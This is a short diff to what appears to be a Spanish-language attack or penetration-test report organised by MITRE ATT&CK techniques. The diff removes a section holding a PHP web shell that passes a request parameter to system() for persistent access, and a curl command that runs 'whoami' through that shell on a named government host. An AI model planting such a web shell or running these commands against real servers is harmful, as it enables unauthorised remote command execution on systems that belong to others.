@@ -712,27 +712,6 @@ resultado:
            valid_lft forever preferred_lft forever
       ```
 
-
-
-
-
-  Instalación de web shell para acceso persistente:
- ```text
-    <?php
-    if(isset($_REQUEST['cmd'])) {
-        system($_REQUEST['cmd'] . " 2>&1");
-    }
-    ?>
- ```
-
-- T1210 – Exploitation of Remote Services  
- ```text
- curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
- ```
-
-
-
-
 ## Command & Control
 - T1071 – Application Layer Protocol
 
